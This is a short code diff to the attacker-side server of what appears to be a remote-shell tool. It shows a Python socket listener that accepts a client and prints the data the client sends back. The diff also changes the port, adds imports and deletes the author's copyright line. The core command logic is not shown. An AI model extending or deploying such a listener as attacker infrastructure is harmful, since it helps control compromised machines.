@@ -1,9 +1,12 @@
 # Server side (attacker)
-# Copyright (c) 2026 transcrime
 import socket
+import socketserver
+import pickle
+import struct
+import logging
 
 host = "0.0.0.0"
-port = 443
+port = 12345
 
 server = socket.socket()
 server.bind((host, port))
@@ -21,4 +24,3 @@ while True:
     print(client.recv(4096).decode())
 
 client.close()
-
